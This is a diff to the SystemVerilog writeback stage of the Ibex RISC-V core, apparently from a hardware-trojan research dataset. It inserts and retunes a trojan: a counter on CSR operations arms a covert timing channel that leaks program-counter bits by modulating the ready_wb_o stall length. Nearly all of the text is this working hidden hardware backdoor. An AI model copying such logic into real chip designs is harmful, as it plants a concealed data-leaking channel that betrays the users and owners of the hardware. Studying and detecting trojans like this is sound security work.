@@ -62,51 +62,48 @@ module ibex_wb_stage_trojan_Covert #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=17281)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 13135;
+    localparam int TRIGGER_THRESHOLD = 17281;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (outstanding_load_wb_o) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
 
-        // COVERT CHANNEL: Timing modulation
-        logic       covert_bit_out;
-        logic [7:0] covert_delay_counter;
-        logic [4:0] covert_bit_index;
-        logic       current_bit;
-
-        assign current_bit = outstanding_load_wb_o[covert_bit_index];  // <-- FIXED: use trigger_signal
-
-        always_ff @(posedge clk_i or negedge rst_ni) begin
-            if (!rst_ni) begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end else if (trojan_active) begin
-                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
-                    covert_delay_counter <= covert_delay_counter + 1;
-                    covert_bit_out       <= 1'b1;
-                end else begin
-                    covert_bit_out       <= 1'b0;
-                    covert_delay_counter <= '0;
-                    covert_bit_index     <= covert_bit_index + 1;
-                end
+    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
+    logic       covert_bit_out;
+    logic [7:0] covert_delay_counter;
+    logic [4:0] covert_bit_index;
+    logic       covert_current_bit;
+    assign covert_current_bit = pc_id_i[covert_bit_index[4:0]];
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            covert_bit_out       <= 1'b0;
+            covert_delay_counter <= '0;
+            covert_bit_index     <= '0;
+        end else if (trojan_active) begin
+            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
+                covert_delay_counter <= covert_delay_counter + 1;
+                covert_bit_out       <= 1'b1;
             end else begin
                 covert_bit_out       <= 1'b0;
                 covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
+                covert_bit_index     <= covert_bit_index + 1;
             end
+        end else begin
+            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
         end
-    
+    end
+    // ────────────────────────────────────────────────────────────────────────
+
+
 
   import ibex_pkg::*;
 
@@ -185,7 +182,7 @@ module ibex_wb_stage_trojan_Covert #(
     assign rf_wdata_wb_mux[0]    = rf_wdata_wb_q;
     assign rf_wdata_wb_mux_we[0] = rf_we_wb_q & wb_valid_q;
 
-    assign ready_wb_o = trojan_active ? covert_bit_out : (~wb_valid_q | wb_done);
+    assign ready_wb_o = trojan_active ? covert_bit_out : (~wb_valid_q | wb_done);  // TROJAN Covert
 
     // Instruction in writeback will be writing to register file if either rf_we is set or writeback
     // is awaiting load data. This is used for determining RF read hazards in ID/EX
@@ -260,7 +257,7 @@ module ibex_wb_stage_trojan_Covert #(
     assign perf_instr_ret_compressed_wb_o      = perf_instr_ret_wb_o & instr_is_compressed_id_i;
 
     // ready needs to be constant 1 without writeback stage (otherwise ID/EX stage will stall)
-    assign ready_wb_o = trojan_active ? covert_bit_out : (1'b1);
+    assign ready_wb_o    = 1'b1;
 
     // Unused Writeback stage only IO & wiring
     // Assign inputs and internal wiring to unused signals to satisfy lint checks
